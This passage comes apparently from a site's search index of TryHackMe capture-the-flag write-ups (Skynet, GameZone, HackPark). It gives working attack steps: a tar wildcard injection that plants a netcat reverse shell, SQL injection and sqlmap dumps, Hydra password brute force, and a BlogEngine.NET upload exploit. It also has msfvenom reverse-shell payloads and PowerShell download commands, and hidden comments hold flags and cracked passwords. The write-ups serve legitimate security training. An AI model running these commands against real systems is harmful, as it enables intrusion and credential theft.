created:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ea file that tells tar to stop at a specific \u003ccode\u003echeckpoint\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eanother file that tells tar what to do at this specific \u003ccode\u003echeckpoint\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eand finally the file that should be executed \u003ccode\u003eshell.sh\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003ecd /var/www/html\ntouch \u0026quot;/var/www/html/--checkpoint=1\u0026quot;\ntouch \u0026quot;/var/www/html/--checkpoint-action=exec=sh shell.sh\u0026quot;\necho \u0026quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc \u0026lt;atk ip\u0026gt; \u0026lt;atkport\u0026gt; \u0026gt;/tmp/f\u0026quot; \u0026gt; shell.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eStart a Netcat listener on the attacker machine with \u003ccode\u003enc -lvnp \u0026lt;port\u0026gt;\u003c/code\u003e and wait until the next cronjob is finished.\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/skynet/thm_skynet_root_wildcards_hub83bfa0bb9e0c2f27229ed4800886e03_6374_20x0_resize_box_2.png" data-src="/docs/tryhackme/skynet/thm_skynet_root_wildcards.png" width="479" height="127" \u003e\n\u003cp\u003eCongrats! You are root!\nNow locate the root flag and finish that room.\u003c/p\u003e\n\u003c!-- root flag 3f0372db24753accc7179a282cd6a949 --\u003e\n'},{id:1,href:"/docs/tryhackme/gamezone/",title:"GameZone",description:"Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!",content:'\u003ch2 id="room-description"\u003eRoom Description\u003c/h2\u003e\n\u003cp\u003eLearn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root! \u003ca href="https://tryhackme.com/room/gamezone"\u003eFind THM room here\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id="used-commands"\u003eUsed Commands\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003esqlmap -r \u0026lt;path to request.txt\u0026gt; --dbms=mysql --dump\nssh \u0026lt;username\u0026gt;@\u0026lt;target ip\u0026gt;\nss -tulpn\nssh -L \u0026lt;bind_port\u0026gt;:\u0026lt;host\u0026gt;:\u0026lt;hostport\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id="task-1"\u003eTask 1\u003c/h2\u003e\n\u003ch3 id="google-whos-the-guy"\u003eGoogle: Who\u0026rsquo;s the guy?\u003c/h3\u003e\n\u003cp\u003eThis guy is known from a videogame called \u003ccode\u003eHitman\u003c/code\u003e.\nI\u0026rsquo;m pretty sure you can find his name on your own.\u003c/p\u003e\n\u003c!-- Agent 47 --\u003e\n\u003ch2 id="task-2"\u003eTask 2\u003c/h2\u003e\n\u003ch3 id="obtain-access-via-sql-injection"\u003eObtain access via SQL Injection\u003c/h3\u003e\n\u003cp\u003eThe task description gives you a good idea about SQL injection and how it can be used or better abused to query some data (sensitive data exposure).\u003c/p\u003e\n\u003cp\u003eThe target is to \u003ccode\u003erewrite\u003c/code\u003e a prepared statement, that is intended to validate i.e. login credentials, so that the statement queries any other valid data.\u003c/p\u003e\n\u003cp\u003eAnswer the next question by using \u003ccode\u003e\' or 1=1 -- -\u003c/code\u003e as username. Password field remains empty.\u003c/p\u003e\n\u003c!-- portal.php --\u003e\n\u003ch2 id="task-3"\u003eTask 3\u003c/h2\u003e\n\u003ch3 id="using-sqlmap"\u003eUsing SQLMap\u003c/h3\u003e\n\u003cp\u003eUse BurpSuite to intercept a request when you search for any game review.\nUse this request as input for a tool called \u003ccode\u003esqlmap\u003c/code\u003e. If you are not familiar with BurpSuite check out the beginner path on THM. There is a room on THM \u003ca href="https://tryhackme.com/room/rpburpsuite"\u003eBurpSuite created by DarkStar7471\u003c/a\u003e that gives you a basic understanding and overview about how to use Burp.\u003c/p\u003e\n\u003cp\u003eCheck your settings in Burp. \u003ccode\u003eIntercept\u003c/code\u003e should be switched on.\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/gamezone/thm_gamezone_proxy_hu495fd9a2d48aa787218a36215fc8da62_9370_20x0_resize_box_2.png" data-src="/docs/tryhackme/gamezone/thm_gamezone_proxy.png" width="803" height="156" alt="Change highlighted settings on Burp"\u003e\n\u003cp\u003eClick the search button in your browser and come back to Burp. You should find something similar to the following screenshot:\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/gamezone/thm_gamezone_portal_request_huc109eaee9ca6765dea0da756c4f672dd_13889_20x0_resize_box_2.png" data-src="/docs/tryhackme/gamezone/thm_gamezone_portal_request.png" width="648" height="312" alt="HTTP Request on portal.php"\u003e\n\u003cp\u003eCopy the content of the request and save it to a file i.e. \u003ccode\u003erequest.txt\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eThen run \u003ccode\u003esqlmap -r \u0026lt;path to request.txt\u0026gt; --dbms=mysql --dump\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eWhen I ran sqlmap I had to confirm with \u003ccode\u003ey\u003c/code\u003e multiple times. SqlMap will show a short description in any case but I\u0026rsquo;d recommend reading and following the execution as you are able to find some usefull information.\u003c/p\u003e\n\u003cp\u003eWhen everything was correct you should now receive the hashed password.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003e[21:57:48] [INFO] writing hashes to a temporary file \'/tmp/sqlmapgpDenn4863/sqlmaphashes-AWGpER.txt\'\ndo you want to crack them via a dictionary-based attack? [Y/n/q] y\n[21:57:55] [INFO] using hash method \'sha256_generic_passwd\'\n[21:57:55] [WARNING] no clear password(s) found\nDatabase: db\nTable: users\n[1 entry]\n\n+------------------------------------------------------------------+-----------+\n| pwd                                                              | username  |\n+------------------------------------------------------------------+-----------+\n| ab5db915fc9cea6c78df88106c6nope57f2b52901ca6c0c6218f04xxxxxxxxxx |\u0026lt;username\u0026gt; |\n+------------------------------------------------------------------+-----------+\n\n[21:57:55] [INFO] table \'db.users\' dumped to CSV file \'/root/.sqlmap/output/10.10.103.176/dump/db/users.csv\'\n[21:57:55] [INFO] fetched data logged to text files under \'/root/.sqlmap/output/10.10.103.176\'\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003c!-- ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 --\u003e\n\u003c!-- agent47 --\u003e\n\u003cp\u003eScroll up and have a look at the output of sqlmap.\nYou should find the \u003ccode\u003eother\u003c/code\u003e table and its name.\u003c/p\u003e\n\u003c!-- post --\u003e\n\u003ch2 id="task-4"\u003eTask 4\u003c/h2\u003e\n\u003ch3 id="whats-the-password"\u003eWhat\u0026rsquo;s the password?\u003c/h3\u003e\n\u003cp\u003eI did not use JohnTheRipper in this case. Instead I tried one out of many online tools available on the internet i.e. \u003ca href="https://hashes.com"\u003ehashes.com\u003c/a\u003e.\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/gamezone/thm_gamezone_hash_hu4235dc8b034b62da822d4e72800f42cb_2796_20x0_resize_box_2.png" data-src="/docs/tryhackme/gamezone/thm_gamezone_hash.png" width="601" height="83" alt="Result of hash lookup"\u003e\n\u003cp\u003eIf you are not yet familiar with john you should check out this room on THM \u003ca href="https://tryhackme.com/room/johntheripper0"\u003eJohn The Ripper created by PoloMints\u003c/a\u003e.\u003c/p\u003e\n\u003c!-- videogamer124 --\u003e\n\u003cp\u003eNow use the username and password and try to connect via ssh.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003essh \u0026lt;username\u0026gt;@10.10.103.176\n\u0026lt;username\u0026gt;@gamezone:~$ dir\nuser.txt\n\u0026lt;username\u0026gt;@gamezone:~$ cat user.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003c!-- 649ac17b1480ac13ef1e4fa579dac95c --\u003e\n\u003ch2 id="task-5"\u003eTask 5\u003c/h2\u003e\n\u003ch3 id="exposing-services-with-reverse-ssh-tunnel"\u003eExposing services with reverse SSH tunnel\u003c/h3\u003e\n\u003cp\u003eThat topic is new to me so it took some time to get an overview and understand the basic concept behind the steps.\u003c/p\u003e\n\u003cp\u003eFollowing steps will guide you through this task.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eConnect via \u003ccode\u003essh \u0026lt;username\u0026gt;@\u0026lt;target ip\u0026gt;\u003c/code\u003e to the target\u003c/li\u003e\n\u003cli\u003erun \u003ccode\u003ess -tulpn\u003c/code\u003e and check the output\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003e\u0026lt;username\u0026gt;@gamezone:~$ ss -tulpn\nNetid State      Recv-Q Send-Q    Local Address:Port      Peer Address:Port\nudp   UNCONN     0      0                     *:10000                *:*\nudp   UNCONN     0      0                     *:68                   *:*\ntcp   LISTEN     0      80            127.0.0.1:3306                 *:*\n----------------------------------------------------------------------------\n|------                    Check this line                          -------|\n----------------------------------------------------------------------------\n| tcp   LISTEN     0      128                   *:10000                *:* |\n----------------------------------------------------------------------------\ntcp   LISTEN     0      128                   *:22                   *:*\ntcp   LISTEN     0      128                  :::80                  :::*\ntcp   LISTEN     0      128                  :::22                  :::*\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003erun \u003ccode\u003essh -L 9000:localhost:10000\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eArgument\u003c/th\u003e\n\u003cth\u003eDescription\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e9000\u003c/td\u003e\n\u003ctd\u003ethis is the port you will enter in your broswer (next step)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003elocalhost\u003c/td\u003e\n\u003ctd\u003ethis is \u003ccode\u003e127.0.0.1\u003c/code\u003e from the output above\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e10000\u003c/td\u003e\n\u003ctd\u003eport from output above\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003eIf you do not understand what\u0026rsquo;s going on, I recommend to have a look at the \u003ca href="https://man.openbsd.org/ssh"\u003eSSH manual\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003essh -L \u0026lt;bind_port\u0026gt;:\u0026lt;host\u0026gt;:\u0026lt;hostport\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003eroot@ip-10-10-136-248:~# ssh -L 9000:localhost:10000 \u0026lt;username\u0026gt;@10.10.19.166\n\u0026lt;username\u0026gt;@10.10.19.166\'s password:\nWelcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n109 packages can be updated.\n68 updates are security updates.\n\n\nLast login: Wed Apr 21 04:46:05 2021 from 10.10.136.248\n\u0026lt;username\u0026gt;@gamezone:~$\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOpen your browser and enter \u003ccode\u003elocalhost:9000\u003c/code\u003e\u003c/p\u003e\n\u003c!-- Webmin --\u003e\n\u003c!-- 1.580 --\u003e\n\u003cp\u003eThe welcome screen will answer the question asking for the name of the CMS. Carefully read the first page where you also find the version.\u003c/p\u003e\n\u003ch2 id="task-6"\u003eTask 6\u003c/h2\u003e\n\u003ch3 id="find-the-exploit"\u003eFind the exploit\u003c/h3\u003e\n\u003cp\u003eNow let\u0026rsquo;s search for an exploit that we can use to gain root and access the flag.\nThere are multiple WriteUps that show you how to manually use that exploit (so did I) as this is the direct way to the root flag.\u003c/p\u003e\n\u003ch3 id="direct-way-to-roottxt-wo-metasploit"\u003eDirect way to root.txt (w/o Metasploit)\u003c/h3\u003e\n\u003cp\u003eDownload and study the exploit. Find following line of code somewhere close to the end of the file:\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/gamezone/thm_gamezone_exploit_hu8c232ba8290a2233cdf4eb41c89ed0b8_6939_20x0_resize_box_2.png" data-src="/docs/tryhackme/gamezone/thm_gamezone_exploit.png" width="633" height="182" alt="code snippet that shows some interesting part in the exploit"\u003e\n\u003cp\u003eWhat do you see when you enter \u003ccode\u003elocalhost:9000/file/show.cgi/bin\u003c/code\u003e in your browser?\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/gamezone/thm_gamezone_cgi_bin_hub4fe0e08a96876c58ae66af0e8d8ab0f_14909_20x0_resize_box_2.png" data-src="/docs/tryhackme/gamezone/thm_gamezone_cgi_bin.png" width="503" height="420" alt="Picture of download form"\u003e\n\u003cp\u003eHmmm\u0026hellip; not what we expected. Let\u0026rsquo;s try something different.\u003c/p\u003e\n\u003cp\u003eWhat happens when you try sending different payload i.e. \u003ccode\u003eetc/passwd\u003c/code\u003e?\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003elocalhost:9000/file/show.cgi/etc/passwd\n\u003c/code\u003e\u003c/pre\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/gamezone/thm_gamezone_cgi_etc_passwd_hud732b96a63e2999a790d7be61d4b25c1_43733_20x0_resize_box_2.png" data-src="/docs/tryhackme/gamezone/thm_gamezone_cgi_etc_passwd.png" width="631" height="579" alt="Picture of /etc/passwd file"\u003e\n\u003cp\u003eUhhh that looks interesting!\u003c/p\u003e\n\u003cdiv class="alert alert-warning d-flex" role="alert"\u003e\n  \u003cdiv class="flex-shrink-1 alert-icon"\u003e💡\u003c/div\u003e\n  \u003cdiv class="w-100"\u003eLet\'s review the description of the exploit: \u003cbr\u003e "[...] allows an authenticated user [...] to execute arbitrary commands with root privileges."\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eHave a look at the hint and you know the location of the root flag. Can you read its content?\u003c/p\u003e\n\u003c!-- a4b945830144bdd71908d12d902adeee --\u003e\n\u003cdiv class="alert alert-warning d-flex" role="alert"\u003e\n  \u003cdiv class="flex-shrink-1 alert-icon"\u003e📌\u003c/div\u003e\n  \u003cdiv class="w-100"\u003eDirect access was only possible because the hint told us the location of the flag. Usually this information is not available and you are forced to gain root in order to find the flag.\u003c/div\u003e\n\u003c/div\u003e\n'},{id:2,href:"/docs/tryhackme/hackpark/",title:"HackPark",description:"Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!",content:'\u003ch2 id="room-description"\u003eRoom Description\u003c/h2\u003e\n\u003cp\u003eBruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine! \u003ca href="https://tryhackme.com/room/hackpark"\u003eFind THM room here\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id="used-commands"\u003eUsed Commands\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003ehydra -l \u0026lt;username\u0026gt; -P \u0026lt;path to wordlist\u0026gt; \u0026lt;target ip\u0026gt; http-post-form \u0026lt;payload\u0026gt;\nsearchsploit \u0026lt;search name\u0026gt;\nnc -lvnp \u0026lt;listener port\u0026gt;\npython3 -m http.server \u0026lt;webserver port\u0026gt;\n\nmsfvenom --list payloads\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026lt;listener ip\u0026gt; LPORT=\u0026lt;listener port\u0026gt; -f exe \u0026gt; shell.exe\nmsfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=\u0026lt;listener ip\u0026gt; LPORT=\u0026lt;listener port\u0026gt; -f exe -o \u0026lt;output filename\u0026gt;\nmsfvenom -p \u0026lt;payload\u0026gt; -a \u0026lt;architecture\u0026gt; --encoder /x86/shikata_ga_nai LHOST=\u0026lt;listener ip\u0026gt; LPORT=\u0026lt;listener port\u0026gt; -f exe -o \u0026lt;output filename\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class="language-powershell"\u003egetuid\npowershell -c \u0026quot;Invoke-WebRequest -Uri \'http://\u0026lt;webserver ip\u0026gt;:\u0026lt;webserver port\u0026gt;/\u0026lt;filename\u0026gt;\' -OutFile \'\u0026lt;output filename\u0026gt;\'\u0026quot;\npowershell \u0026quot;(New-Object System.Net.WebClient).Downloadfile(\'http://\u0026lt;webserver ip\u0026gt;:\u0026lt;webserver port\u0026gt;/\u0026lt;filename\u0026gt;\',\'\u0026lt;output filename\')\u0026quot;\nren \u0026lt;filename\u0026gt; \u0026lt;new filename\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id="task-1"\u003eTask 1\u003c/h2\u003e\n\u003ch3 id="google-brwhos-the-clown"\u003eGoogle: \u003cbr\u003eWho\u0026rsquo;s the clown?\u003c/h3\u003e\n\u003cp\u003eA quick search on the source of code didn\u0026rsquo;t give me any hints.\u003cbr\u003e\nSo I searched on google and finally found the name.\u003cbr\u003e\n\u003cdiv class="alert alert-warning d-flex" role="alert"\u003e\n  \u003cdiv class="flex-shrink-1 alert-icon"\u003e💡\u003c/div\u003e\n  \u003cdiv class="w-100"\u003eHint: For me it was not the first result\u003c/div\u003e\n\u003c/div\u003e\u003c/p\u003e\n\u003c!-- -\u003e Pennywise --\u003e\n\u003ch2 id="task-2"\u003eTask 2\u003c/h2\u003e\n\u003cp\u003eFind the login page in the menu.\nThis gives us some more knowledge about the used components.\u003c/p\u003e\n\u003c!-- -\u003e blogengine.net --\u003e\n\u003ch3 id="hydra-brbrute-forcing-a-password"\u003eHydra: \u003cbr\u003eBrute-forcing a password\u003c/h3\u003e\n\u003cp\u003eBefore I started using Hydra I did a quick search on google and tried to find some default credentials.\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eUsername\u003c/th\u003e\n\u003cth\u003ePassword\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eadmin\u003c/td\u003e\n\u003ctd\u003eadmin\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eadmin\u003c/td\u003e\n\u003ctd\u003ePassw@rd123\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003eUnfortunately this didn\u0026rsquo;t work out so let\u0026rsquo;s continue with Hydra.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003ehydra -l admin -P /usr/share/wordlists/rockyou.txt \u0026lt;target ip\u0026gt; http-post-form \u0026lt;payload\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eParameter\u003c/th\u003e\n\u003cth\u003eDescription\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e-l\u003c/td\u003e\n\u003ctd\u003e\u0026lt;username\u0026gt;\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e-P\u003c/td\u003e\n\u003ctd\u003e\u0026lt;wordslist\u0026gt;\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u0026lt;payload\u0026gt;\u003c/td\u003e\n\u003ctd\u003eeverything starting \u003cbr\u003efrom \u003ccode\u003e__VIEWSTATE=...\u003c/code\u003e \u003cbr\u003eto \u003ccode\u003e...LoginButton=Log+in\u003c/code\u003e \u003cbr\u003echeck the following screenshot\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003eIf everything worked you should receive something like this\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003e[80][http-post-form] host: 10.10.9.86   login: admin   password: 1qaxxxxx\n1 of 1 target successfully completed, 1 valid password found\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id="burp-suite-br-brute-forcing-a-password"\u003eBurp-Suite: \u003cbr\u003e Brute-forcing a password\u003c/h3\u003e\n\u003cp\u003eBurp-Suites Intruder is another option guessing passwords.\nThe Source code of the login page shows that this login seems to be for an administrator.\nSo I decided to start out with \u0026ldquo;admin\u0026rdquo; as username and any password wordlist you can find.\u003c/p\u003e\n\u003cp\u003eYou should give it a try.\u003c/p\u003e\n\u003c!-- -\u003e "1qaz2wsx" found as valid password --\u003e\n\u003ch3 id="burp-suite-brrequest-type-of-login-form"\u003eBurp-Suite: \u003cbr\u003eRequest type of login form\u003c/h3\u003e\n\u003cp\u003eCheckout the source code of the webpage or if you used Burp Suite check the request when you try to login with any credentials.\u003c/p\u003e\n\u003c!-- -\u003e POST --\u003e\n\u003ch2 id="task-3"\u003eTask 3\u003c/h2\u003e\n\u003cp\u003eCheck out the about page from the sidebar to find the current version of BlogEngine\u003c/p\u003e\n\u003c!-- -\u003e 3.3.6.0 --\u003e\n\u003ch3 id="searchsploit-find-exploits"\u003eSearchSploit: Find exploits\u003c/h3\u003e\n\u003cp\u003eWhat is the CVE Version?\nYou will get multiple reports when you search for BlogEngine.NET.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003esearchsploit BlogEngine.NET\n\u003c/code\u003e\u003c/pre\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/hackpark/thm_hackpark_searchsploit_result_huf069f124cedceadb21d6244e496177fe_22383_20x0_resize_box_2.png" data-src="/docs/tryhackme/hackpark/thm_hackpark_searchsploit_result.png" width="811" height="233" alt="Result of search with searchsploit"\u003e\n\u003cp\u003e3 of them are regarding remote code execution (that\u0026rsquo;s what we are striving for) but only 1 of them is valid. Go and find the right one or try them all.\u003c/p\u003e\n\u003c!-- -\u003e CVE-2019-6714 --\u003e\n\u003ch3 id="gain-a-reverse-shell"\u003eGain a reverse shell\u003c/h3\u003e\n\u003cp\u003eCopy the file to your working directory.\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/hackpark/thm_searchsploit_download_hu591380107dade826969b413f3849d5e0_9357_20x0_resize_box_2.png" data-src="/docs/tryhackme/hackpark/thm_searchsploit_download.png" width="631" height="123" alt="Copy exploit file to working directory"\u003e\u003c/p\u003e\n\u003cp\u003eBefore we answer the next question we need to gain access to the server.\nLet\u0026rsquo;s run that exploit\u003c/p\u003e\n\u003cdiv class="alert alert-warning d-flex" role="alert"\u003e\n  \u003cdiv class="flex-shrink-1 alert-icon"\u003e📌\u003c/div\u003e\n  \u003cdiv class="w-100"\u003eRead the description of the exploit and follow the instructions \u003cbr\u003e you will find everything you need to know in the file header\u003c/div\u003e\n\u003c/div\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003evim 46353.cs\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eChange the \u003ccode\u003e\u0026lt;listener ip\u0026gt;\u003c/code\u003e and \u003ccode\u003e\u0026lt;listener port\u0026gt;\u003c/code\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/hackpark/thm_exploit_step_1_hu834e4985a007f26c8c8c736b0a590272_19525_20x0_resize_box_2.png" data-src="/docs/tryhackme/hackpark/thm_exploit_step_1.png" width="905" height="262" alt="Changes on exploit file: IP and Port"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSetup a netcat listener on that port \u003ccode\u003enc -lvnp \u0026lt;listener port\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRename exploit file to \u003ccode\u003ePostView.ascx\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUpload the file on the target server by editing a post (read the description) \u003cbr\u003e\u003ccode\u003ehttp://\u0026lt;target ip\u0026gt;/admin/app/editor/editpost.cshtml\u003c/code\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/hackpark/thm_exploit_step_2_huad672dfe8e42fa794d7963474e7f75aa_23855_20x0_resize_box_2.png" data-src="/docs/tryhackme/hackpark/thm_exploit_step_2.png" width="697" height="427" alt="Screenshot of the icon to use to upload a file"\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/hackpark/thm_exploit_step_3_hud6116d5eee87cb72177c4cd184fc1c71_16430_20x0_resize_box_2.png" data-src="/docs/tryhackme/hackpark/thm_exploit_step_3.png" width="697" height="427" alt="Confirmation the file was uploaded"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUse the browser to access the base URL like so: \u003cbr\u003e\u003ccode\u003ehttp://\u0026lt;target ip\u0026gt;/?theme=../../App_Data/files\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ccode\u003ewhoami\u003c/code\u003e will answer the next question\u003cbr\u003e\nWho is the webserver running as?\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/hackpark/thm_exploit_step_4_huc90c99eb7a3268c56ae1d08386ee75ef_34331_20x0_resize_box_2.png" data-src="/docs/tryhackme/hackpark/thm_exploit_step_4.png" width="490" height="150" alt="Established reverse shell with running whoami: iis apppool\\blog"\u003e\n\u003c!-- -\u003e iis appool\\blog --\u003e\n\u003ch2 id="task-4-metasploit"\u003eTask 4 (Metasploit)\u003c/h2\u003e\n\u003ch3 id="compromise-the-machine"\u003eCompromise the machine\u003c/h3\u003e\n\u003cp\u003eLet\u0026rsquo;s create a better shell using msfvenom.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003emsfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026lt;listener ip\u0026gt; LPORT=9001 -f exe \u0026gt; shell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/hackpark/thm_t4_shell_exe_hu9c875d8d6a0f7b018006a748da85b561_17936_20x0_resize_box_2.png" data-src="/docs/tryhackme/hackpark/thm_t4_shell_exe.png" width="895" height="140" alt="Creation of reverse shell executable with msfvenom"\u003e\n\u003cp\u003eSetup a http.server on the attacker machine. I used \u003ccode\u003epython3\u003c/code\u003e and \u003ccode\u003ehttp.server\u003c/code\u003e for this.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003epython3 -m http.server 8000\n\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv class="alert alert-warning d-flex" role="alert"\u003e\n  \u003cdiv class="flex-shrink-1 alert-icon"\u003e💡\u003c/div\u003e\n  \u003cdiv class="w-100"\u003eKeep in mind that the webserver was started on the same folder where the prepared exploit is saved to.\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eUse the existing reverse shell and download the \u003ccode\u003eshell.exe\u003c/code\u003e on the victim machine using powershell.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003epowershell \u0026quot;(New-Object System.Net.WebClient).Downloadfile(\'http://\u0026lt;webserver ip\u0026gt;:8000/shell.exe\',\'shell.exe\')\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/hackpark/thm_t4_upload_shell_exe_huc78d2798b661d7e14d6f20e7d33ea12b_7502_20x0_resize_box_2.png" data-src="/docs/tryhackme/hackpark/thm_t4_upload_shell_exe.png" width="571" height="71" alt="python3 webserver on port 8000"\u003e\n\u003cp\u003eBefore executing \u003ccode\u003eshell.exe\u003c/code\u003e let\u0026rsquo;s start Metasploit and setup a meterpreter/reverse_shell_tcp\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003emsfconsole -q\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCheck \u003ccode\u003eoptions\u003c/code\u003e and set the required parameters.\u003c/p\u003e\n\u003cdiv class="alert alert-warning d-flex" role="alert"\u003e\n  \u003cdiv class="flex-shrink-1 alert-icon"\u003e📌\u003c/div\u003e\n  \u003cdiv class="w-100"\u003eLPORT must match with the used port when we created shell.exe. I used 9001!\u003c/div\u003e\n\u003c/div\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003eset LHOST \u0026lt;atk ip\u0026gt;\nset LPORT 9001\nrun\n\u003c/code\u003e\u003c/pre\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/hackpark/thm_t4_multi_handler_hu8f993e90840028cd47d1c2e7474eec5a_27799_20x0_resize_box_2.png" data-src="/docs/tryhackme/hackpark/thm_t4_multi_handler.png" width="782" height="535" alt="Options on metasploit multi/handler with meterpreter/reverse_tcp payload"\u003e\n\u003cp\u003eUse \u003ccode\u003erun\u003c/code\u003e to start the listener. If everything is correct you should now see a message like this:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003e[*] Started reverse TCP handler on 10.10.219.52:9001\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eRun \u003ccode\u003eshell.exe\u003c/code\u003e on the victim 